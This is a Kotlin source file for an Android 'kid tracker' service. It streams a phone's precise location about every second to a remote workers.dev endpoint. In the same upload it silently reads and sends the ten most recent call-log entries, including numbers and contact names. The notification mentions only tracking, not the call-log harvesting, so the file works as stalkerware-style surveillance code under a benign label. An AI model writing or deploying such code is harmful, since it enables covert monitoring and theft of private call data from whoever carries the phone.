package com.kidtracker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.Cursor
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import android.content.pm.PackageManager
import com.google.android.gms.location.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import android.util.Log
import com.kidtracker.R

class LocationService : Service() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var locationCallback: LocationCallback? = null
    private var trackingCode: String = ""
    private val executor = Executors.newSingleThreadExecutor()
    private var lastSentLocation: Location? = null
    private var lastSentTime: Long = 0

    companion object {
        private const val CHANNEL_ID = "TrackerIDChannel"
        private const val NOTIFICATION_ID = 1
        private const val TAG = "TrackerID"
        private var API_BASE: String = "https://tsp.omaromartest12.workers.dev"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        trackingCode = intent?.getStringExtra("tracking_code") ?: ""
        if (trackingCode.isEmpty()) {
            stopSelf()
            return START_NOT_STICKY
        }

        locationCallback?.let {
            try { fusedLocationClient.removeLocationUpdates(it) } catch (_: Exception) {}
        }
        locationCallback = null

        val notification = createNotification("Connecting...")
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        startLocationUpdates()
        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(R.string.tracking_active),
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = getString(R.string.tracking_notification)
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("TSP Active")
            .setContentText(statusText)
            .setSubText("Tracker System Pro")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun updateNotification(statusText: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, createNotification(statusText))
    }

    private fun startLocationUpdates() {
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000)
            .setMinUpdateIntervalMillis(500)
            .setWaitForAccurateLocation(false)
            .build()

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { location ->
                    val now = System.currentTimeMillis()
                    val timeSinceLastSend = now - lastSentTime
                    val distFromLast = lastSentLocation?.distanceTo(location) ?: Float.MAX_VALUE

                    if (timeSinceLastSend >= 1000 || distFromLast > 5) {
                        sendLocation(location)
                    }
                }
            }
        }

        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission not granted", e)
            stopSelf()
        }
    }

    private fun sendLocation(location: Location) {
        val code = trackingCode
        val latitude = location.latitude
        val longitude = location.longitude
        val accuracy = location.accuracy
        val batteryLevel = getBatteryLevel()
        val calls = getCallLog()

        lastSentLocation = location
        lastSentTime = System.currentTimeMillis()

        updateNotification("Tracking \u2022 $code \u2022 Live")

        executor.execute {
            try {
                val url = URL("$API_BASE/api/update-location")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 5000
                conn.doOutput = true

                val json = JSONObject().apply {
                    put("code", code)
                    put("latitude", latitude)
                    put("longitude", longitude)
                    put("accuracy", accuracy)
                    put("battery", batteryLevel)
                    put("calls", calls)
                }
                conn.outputStream.write(json.toString().toByteArray())

                val response = conn.responseCode
                Log.d(TAG, "Sent: $latitude,$longitude calls=${calls.length()} (HTTP $response)")
                conn.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send location", e)
            }
        }
    }

    private fun getCallLog(): JSONArray {
        val callsArray = JSONArray()
        val hasPermission = ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED

        if (!hasPermission) {
            Log.w(TAG, "READ_CALL_LOG permission not granted")
            return callsArray
        }

        try {
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC LIMIT 10"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(0) ?: ""
                    val name = it.getString(1) ?: ""
                    val date = it.getLong(2)
                    val duration = it.getInt(3)
                    val type = it.getInt(4)
                    callsArray.put(JSONObject().apply {
                        put("number", number)
                        put("name", name)
                        put("date", date)
                        put("duration", duration)
                        put("type", type)
                    })
                }
            }
            Log.d(TAG, "Call log: found ${callsArray.length()} calls")
        } catch (e: SecurityException) {
            Log.w(TAG, "Call log permission denied at query time", e)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read call log", e)
        }
        return callsArray
    }

    private fun getBatteryLevel(): Int {
        val batteryManager = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        return batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    override fun onDestroy() {
        locationCallback?.let {
            try { fusedLocationClient.removeLocationUpdates(it) } catch (_: Exception) {}
        }
        executor.shutdownNow()
        super.onDestroy()
    }
}
